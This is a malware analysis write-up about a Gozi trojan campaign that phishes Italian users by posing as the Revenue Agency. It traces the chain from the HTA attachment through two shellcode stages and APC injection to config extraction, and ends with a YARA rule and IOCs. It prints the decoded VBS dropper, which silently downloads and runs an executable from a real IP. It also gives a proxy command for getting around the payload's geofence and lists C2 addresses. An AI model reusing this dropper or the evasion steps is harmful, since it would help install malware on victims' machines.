---
title: "Gozi - Italian ShellCode Dance"
classes: wide
header:
  teaser: /assets/images/Gozi-Itallian-Shellcode-Dance/logo.png
  overlay_image: /assets/images/Gozi-Itallian-Shellcode-Dance/logo.png
  overlay_filter: 0.5
ribbon: DarkSlateBlue
excerpt: "Breakdown of a recent Gozi trojan Italian targeted campaign"
description: "Breakdown of a recent Gozi trojan Italian targeted campaign"
categories:
  - Threat Breakdown
tags:
  - Gozi
  - Jscript 
  - ShellCode
  - IDA
  - Injection
  - Config Extraction
  - Yara
toc: true
toc_sticky: true
toc_label: "On This Blog"
toc_icon: "biohazard"
---

# Intro
In this blogpost I will be going through a recent campaign targeting the Italian audience which impersonate to "The Agenzia delle Entrate" (Italian Revenue Agency) luring the victims to execute and be part of Gozi botnet.

# The Phish

A massive malspam email campaign was spreading around the globe targeting italian individuals impersonating to [**Agenzia delle Entrate**](https://www.agenziaentrate.gov.it/portale/) letting the users know that there is some problem with VAT and payment related documents:

![image.png](/assets/images/Gozi-Itallian-Shellcode-Dance/1.png)

Translation:
> Dear Customer,from the examination of the data and payments relating to the Communication of periodic VAT eliminations, which you presented for the quarter 2023, some inconsistencies emerged.The notifications relating to the inconsistencies found are accessible in the "Tax box" (the Agency section)accessible from the Revenue Agency website (www.agenziaentrate.gov.it) and in the complete version in the archive attached to the current e-mail.This e-mail was created automatically, therefore we recommend that you do not reply to this e-mail address.Verification office,National Directorate of the Revenue Agency

The mail contains an attachment: `AgenziaEntrate.hta` which is part of the Social Engineering technique the threat actor tries to apply by letting the user know in the mail that he isn't suppose to reply back to the mail (as it's an automatically created mail) and the only choice left for the user is to download and open the attachment.

# Execution Chain
Below you can see a diagram of the execution chain from the moment the phishing mail was opened:

![image-2.png](/assets/images/Gozi-Itallian-Shellcode-Dance/2.png)

# AgenziaEntrate.hta
As I've mentioned the email has an `.hta` attachment. the hta file contains inside of itself a few empty lines at the beginning and afterward a quite good amount of nonsense data:

![image-2.png](/assets/images/Gozi-Itallian-Shellcode-Dance/3.png)

So the first thing I've noticed is obfuscated code inside of `script` tags:

![image-3.png](/assets/images/Gozi-Itallian-Shellcode-Dance/4.png)

After cleaning the script abit we can see clearly what happens here:

![image-4.png](/assets/images/Gozi-Itallian-Shellcode-Dance/5.png)

The script simply takes escaped string and unescaping it. 

Below is a quick script that does the job, after unescaping the string a URL decode operation was required also to see clearly the output:


```python
import urllib.parse

escapedStr = "do\143u\155%65\156t%2E\167%72%69%74e%28%27%3C%27%2B%27%73%63\162i\160%74%20l\141%6E\147%75ag%65%3Dj\163\143%72i\160%74%2Een\143%6Fd%65%3E%27%29"
unicodeDecodedStr = escapedStr.encode('utf-8').decode('unicode_escape')
urlDecodedStr = urllib.parse.unquote(unicodeDecodedStr)

print(urlDecodedStr)
```

    document.write('<'+'script language=jscript.encode>')


# Jscript Encode
As we can see from the output, the content is encoded using [jscript.encode](https://en.wikipedia.org/wiki/JScript.Encode#:~:text=Encode%20is%20a%20method%20created,the%20source%20code%20from%20copying.) and it can be decoded using this [tool](https://gist.github.com/bcse/1834878#file-scrdec18-vc8-exe).<br>After decoding the encoded data, the script will unescape a huge blob of data:

![image.png](/assets/images/Gozi-Itallian-Shellcode-Dance/6.png)

Using online tool such as [CyberChef](https://gchq.github.io/CyberChef/) I've URL decoded the blob of data and at the first part of the data looked like obfuscated JS code, but when I've scrolled down I found out another script written in VBS:

![image-2.png](/assets/images/Gozi-Itallian-Shellcode-Dance/7.png)

```vb
Window.ReSizeTo 0, 0
Window.MoveTo -4000, -4000
set runn = CreateObject("WScript.Shell")
dim file
file = "%systemroot%\\System32\\LogFiles\\" & "\login.exe"
const DontWaitUntilFinished = false, ShowWindow = 1, DontShowWindow = 0, WaitUntilFinished = true
set oShell = CreateObject("WScript.Shell")
oShell.Run "cmd /c curl http://191.101.2.39/installazione.exe -o %systemroot%\\System32\\LogFiles\\login.exe ", DontShowWindow, WaitUntilFinished
runn.Run file ,0
Close
```

Clearly the script tries to download external payload and drop it to the user's disk at `C:\Windows\System32\LogFiles\login.exe`


# Italy Geofence Bypass

The payload that the script tries to retirve utilize the `Curl` command.<br>
I've tried to download the file and got the error: `curl: (52) Empty reply from server`

![image.png](/assets/images/Gozi-Itallian-Shellcode-Dance/8.png)

So after digging throught the flags of Curl, I found the [-x flag](https://curl.se/docs/manpage.html#-x) which allow access the URL through a proxy.<br>So I looked for HTTP proxies in Italy ([free-proxy.cz](http://free-proxy.cz/en/proxylist/country/IT/http/ping/all)) And by executed the below command I've managed to retrieve the payload:
```
curl -x 185.22.57.134:8080 http://191.101.2.39/installazione.exe -o C:\Users\igal\Desktop\AgenziaEntrate1.bin
```

![image-2.png](/assets/images/Gozi-Itallian-Shellcode-Dance/9.png)

# Installazione.exe 
In this part I will be covering the intial loader and going through some of it functionalities. I've opened the loader in IDA and the first thing that caught my attention was the huge `.data` section:

![image.png](/assets/images/Gozi-Itallian-Shellcode-Dance/10.png)

It's a good indication that we're seeing a packed binary.<br>
Now going through `WinMain` there is a single call to a function before the termination of the program:

![image-2.png](/assets/images/Gozi-Itallian-Shellcode-Dance/11.png)

## sub_40471B
This function will be the actul main function of the loader, it will call the function `mwDecryptWrapper_4041AE` which will be the wrapper function for the decryption routine and those will be the function arguments:
1. ShellCode allocated memory
2. Blob1 Length
3. Blob3 Data

![image-3.png](/assets/images/Gozi-Itallian-Shellcode-Dance/12.png)
![image-4.png](/assets/images/Gozi-Itallian-Shellcode-Dance/13.png)

The wrapper function will then call `mwDecrypt_4040D8` and eventually the last function that will be called before `sub_40471B` ends will be `mwExecGoziShell_4042A6`:

![image-5.png](/assets/images/Gozi-Itallian-Shellcode-Dance/14.png)
![image-6.png](/assets/images/Gozi-Itallian-Shellcode-Dance/15.png)

The function will jump into the allocated memory that it's data was previously decrypted.
## Dynamic Analysis 
Lets see this in the dynamic view:<br>
**Decryption Phase:**

![image-7.png](/assets/images/Gozi-Itallian-Shellcode-Dance/16.png)

**Jump To ShellCode:**

![image-8.png](/assets/images/Gozi-Itallian-Shellcode-Dance/17.png)

# 1st ShellCode

Now that we've entered the 1st ShellCode, We can simply dump it and open it in IDA to futher static analyze it before we dynamically finding our next interesting POI.<br>

## Dynamic API Resolve    
The first thing the ShellCode will do is resolving API's it will need to further execute some function, it will be done by using a technique called [**PEB Walk**](https://www.ired.team/offensive-security/code-injection-process-injection/finding-kernel32-base-and-function-addresses-in-shellcode) and will combine inside of it hashes that simple google can help us to retrieve the hashes values, those are the API's that will be resolved:
- LoadLibraryA
- GetProcAddress
- GlobalAlloc
- GetLastError
- Sleep
- VirtualAlloc
- CreateToolhelp32Snapshot
- Module32First
- CloseHandle

![image.png](/assets/images/Gozi-Itallian-Shellcode-Dance/18.png)

## resloveShellCode2_465
Then In order to jump to the next stage ShellCode a new memory will be allocated using `VirtualAlloc` that was previously resolved and then the next shell will be written in the freshly allocated memory (after decrypting it\[`decryptShellCode2_4F2`\]), and after that the function will jump to the ShellCode:

![image-2.png](/assets/images/Gozi-Itallian-Shellcode-Dance/19.png)

# 2nd ShellCode
Same as the first ShellCode, the second ShellCode will start by resolving API deynamically, those are the API's it will resolve:
- VirtualAlloc
- VirtualProtect
- VirtualFree
- GetVersionExA
- TerminateProcess
- ExitProcess
- SetErrorMode

After the API's were resolved the ShellCode will use VirtualAlloc to create a new memory section (`0x230000`):

![image.png](/assets/images/Gozi-Itallian-Shellcode-Dance/20.png)

Then a decryption loop will occur which will resolve and overwrite the freshly allocated memory with an executable binary:

![image-2.png](/assets/images/Gozi-Itallian-Shellcode-Dance/21.png)

At this point I've dumped the binary and moved to analyze it.

# Gozi Loader
I've tried to upload the binary to [Tria.ge](https://tria.ge/dashboard) and instantly got a result that they found it's Gozi binary statically:

![image.png](/assets/images/Gozi-Itallian-Shellcode-Dance/22.png)

Which made me a bit confused because I know that Gozi stores references to it's config below the section table (and there supposed to be 3 config entries)

![image-2.png](/assets/images/Gozi-Itallian-Shellcode-Dance/23.png)

So I've opened IDA and tried to look what's going on with this binary, it contains a small amount of function (about 30) and in the "main" function, it will simply hold a reference to another function and will use the API `ExitProcess` in order to execute this function:

![image-4.png](/assets/images/Gozi-Itallian-Shellcode-Dance/24.png)

## APC Injection
I was hovering over the function `mwMainFunc_4019F1` and suddently saw a call to the API `QueueUserAPC` 

![image-5.png](/assets/images/Gozi-Itallian-Shellcode-Dance/25.png)

The main thing we need to know about APC Injection is that the first argument passed to `QueueUserAPC` will be the malicious content that the executed thread will execute. (In this case the developers of Gozi used the API `SleepEx` in order to perform the injection) <br>In this case the first passed argument is actually a function `pfnAPC_40139F` which will decrypt the final Gozi payload and execute it using `ExitThread` 

![image-6.png](/assets/images/Gozi-Itallian-Shellcode-Dance/26.png)

Lets see this in the debugger:
**APC Injection:**

![image-7.png](/assets/images/Gozi-Itallian-Shellcode-Dance/27.png)

**Final Payload Decryption Routine:**

![image-8.png](/assets/images/Gozi-Itallian-Shellcode-Dance/28.png)

Now I can dump the final payload and see whether or not I can extract some configs out of it.

# Gozi Binary
I took a look below the section table and now we have 3 config entries as I would've expected:

![image.png](/assets/images/Gozi-Itallian-Shellcode-Dance/29.png)

I won't be going over Gozi's capability but what was interesting for me is extracting the configurations for it, so I've read about how Gozi handles the configuration and how to work around it using [SentinelOne blog](https://www.sentinelone.com/labs/writing-malware-configuration-extractors-for-isfb-ursnif/) about gozi and this was my final script:


```python
import pefile
import re
import struct
import malduck
import binascii

FILE_PATH = '/Users/igal/malwares/gozi/01-03-23/8. final.bin'

FILE_DATA = open(FILE_PATH, 'rb').read()

def locate_structs():
    struct_list = []

    pe = pefile.PE(FILE_PATH)

    nt_head = pe.DOS_HEADER.e_lfanew
    file_head = nt_head + 4
    opt_head = file_head +18
    size_of_opt_head = pe.FILE_HEADER.SizeOfOptionalHeader
    text_section_table = opt_head + size_of_opt_head + 2
    num_sections = pe.FILE_HEADER.NumberOfSections
    size_of_section_table = 32 * (num_sections + 1)
    end_of_section_table = text_section_table + size_of_section_table
    jj_struct_start = end_of_section_table + 48
    structs = FILE_DATA[jj_struct_start:jj_struct_start + 60]    
    return structs.split(b'JJ')[1:]

def convertEndian(byteData):
    big_endian_uint = struct.unpack('>I', byteData)[0]
    little_endian_uint = big_endian_uint.to_bytes(4, byteorder='little')
    return little_endian_uint.hex()

def blobDataRetrieve(blobOff, blobLen):
    pe = pefile.PE(FILE_PATH)
    configOff = pe.get_offset_from_rva(blobOff)
    blobData = FILE_DATA[configOff:configOff + blobLen].split(b'\x00\x00\x00\x00\x00')[0]
    return blobData
    
def aplibDecryption(config_data):
    ptxt_data = malduck.aplib.decompress(config_data)
    #print(ptxt_data)
    entry_data = []
    for entry in ptxt_data.split(b"\x00"):
        if len(entry) > 1:
            entry_data.append(entry.decode('ISO-8859-1'))
    return entry_data

def decodeC2(dataArray):
    for data in dataArray:
        if data.isascii() and len(data) > 20:
            c2List = data.split(' ')
            for c2 in c2List:
            	print(f'\t[+] {c2}')

dataStructs = locate_structs()

for data in dataStructs:
    crcHash = convertEndian(data[6:10])
    if crcHash == 'e1285e64': #RSA Key Hash
        blobOffset = int(convertEndian(data[10:14]), 16)
        configOff = pe.get_offset_from_rva(blobOffset)
        print(f'[*] RSA Key at offset:{hex(configOff)}')
    if crcHash == '8fb1dde1': #Config Hash
        blobOffset = int(convertEndian(data[10:14]), 16)
        blobLength = int(convertEndian(data[14:18]), 16)
        blobData = blobDataRetrieve(blobOffset, blobLength)
        decryptedData = aplibDecryption(blobData)
        print('[*] C2 List:')
        decodeC2(decryptedData)
    if crcHash == '68ebb983': #Wordlist Hash
        blobOffset = int(convertEndian(data[10:14]), 16)
        blobLength = int(convertEndian(data[14:18]), 16)
        blobData = blobDataRetrieve(blobOffset, blobLength)
        decryptedData = aplibDecryption(blobData)[0].split('\r\n')[1:-1]
        print('[*] Wordlist:')
        for word in decryptedData:
            print(f'\t[+] {word}')
```

    [*] RSA Key at offset:0xa800
    [*] C2 List:
    	[+] checklist.skype.com
    	[+] 62.173.141.252
    	[+] 31.41.44.33
    	[+] 109.248.11.112
    [*] Wordlist:
    	[+] list
    	[+] stop
    	[+] computer
    	[+] desktop
    	[+] system
    	[+] service
    	[+] start
    	[+] game
    	[+] stop
    	[+] operation
    	[+] black
    	[+] line
    	[+] white
    	[+] mode
    	[+] link
    	[+] urls
    	[+] text
    	[+] name
    	[+] document
    	[+] type
    	[+] folder
    	[+] mouse
    	[+] file
    	[+] paper
    	[+] mark
    	[+] check
    	[+] mask
    	[+] level
    	[+] memory
    	[+] chip
    	[+] time
    	[+] reply
    	[+] date
    	[+] mirrow
    	[+] settings
    	[+] collect
    	[+] options
    	[+] value
    	[+] manager
    	[+] page
    	[+] control
    	[+] thread
    	[+] operator
    	[+] byte
    	[+] char
    	[+] return
    	[+] device
    	[+] driver
    	[+] tool
    	[+] sheet
    	[+] util
    	[+] book
    	[+] class
    	[+] window
    	[+] handler
    	[+] pack
    	[+] virtual
    	[+] test
    	[+] active
    	[+] collision
    	[+] process
    	[+] make
    	[+] local
    	[+] core


# Yara Rule
The below rule was created to hunt down unpacked binaries:
```vb
import "pe"
rule Win_Gozi_JJ {
    meta:
		description = "Gozi JJ Structure binary rule"
		author = "Igal Lytzki"
		malware_family = "Gozi"
		date = "15-03-23"
		
    strings:
        $fingerprint = "JJ" ascii
        $peCheck = "This program cannot be run in DOS mode" ascii
    condition:
		all of them and #fingerprint >= 2 and for all i in (1..#fingerprint - 1): (@fingerprint[i] < 0x400 and @fingerprint[i] > 0x250 and @fingerprint[i + 1] - @fingerprint[i] == 0x14)
}
```

You can see the result of proactive hunt using [unpac.me](https://www.unpac.me/yara/results/9fbb4b2c-ecaf-40bc-bf8f-6c8162189021) yara hunt 

# Summary
In this blogpost we went over a recent Gozi distribution campaign that was targeting the Italian audience.<br>The developers added some extra layers of protection to insure the payloads are being opened by Italian only users and by this bypass AV's to identify the retrieved payload.

# IOC's
- **Samples:**
	- AgenziaEntrate.hta - [a3cec099b936e9f486de3b1492a81e55b17d5c2b06223f4256d49afc7bd212bc](https://bazaar.abuse.ch/sample/a3cec099b936e9f486de3b1492a81e55b17d5c2b06223f4256d49afc7bd212bc)
	- AgenziaEntrate_decoded.js - [c99f4de75e3c6fe98d6fbbcd0a7dbf45e8c7539ec8dc77ce86cea2cfaf822b6a](https://bazaar.abuse.ch/sample/c99f4de75e3c6fe98d6fbbcd0a7dbf45e8c7539ec8dc77ce86cea2cfaf822b6a/)
	- installazione.exe - [9d1e71b94eab825c928377e93377feb62e02a85b7d750b883919207119a56e0d](https://bazaar.abuse.ch/sample/9d1e71b94eab825c928377e93377feb62e02a85b7d750b883919207119a56e0d/)
	- shellcode1.bin - [ebea18a2f0840080d033fb9eb3c54a91eb73f0138893e6c29eb7882bf74c1c30](https://bazaar.abuse.ch/sample/ebea18a2f0840080d033fb9eb3c54a91eb73f0138893e6c29eb7882bf74c1c30/)
	- shellcode2.bin - [df4f432719d32be6cc61598e9ca9a982dc0b6f093f8314c8557457729df3b37f](https://bazaar.abuse.ch/sample/df4f432719d32be6cc61598e9ca9a982dc0b6f093f8314c8557457729df3b37f/)
	- gozi loader.bin - [061c271c0617e56aeb196c834fcab2d24755afa50cd95cc6a299d76be496a858](https://bazaar.abuse.ch/sample/061c271c0617e56aeb196c834fcab2d24755afa50cd95cc6a299d76be496a858/)
	- gozi binary.bin - [876860a923754e2d2f6b1514d98f4914271e8cf60d3f95cf1f983e91baffa32b](https://bazaar.abuse.ch/sample/876860a923754e2d2f6b1514d98f4914271e8cf60d3f95cf1f983e91baffa32b)

- **C2's:**
	- 62.173.141.252
	- 31.41.44.33
	- 109.248.11.112

# References
- [Kernel32.dll hash resolve](https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/space-pirates-tools-and-connections/)
- [Imports hashes resolve](https://github.com/mandiant/capa-rules/issues/175)
- [Unprotect.it APC Injection](https://unprotect.it/technique/apc-injection/)
- [Gozi crc hash resolve](https://cert-agid.gov.it/news/yau-parte-8-il-secondo-stadio-configurazione-e-download/)
- [OaLabs Gozi notes](https://research.openanalysis.net/config/python/yara/isfb/rm3/gozi/2022/10/06/isfb.html)
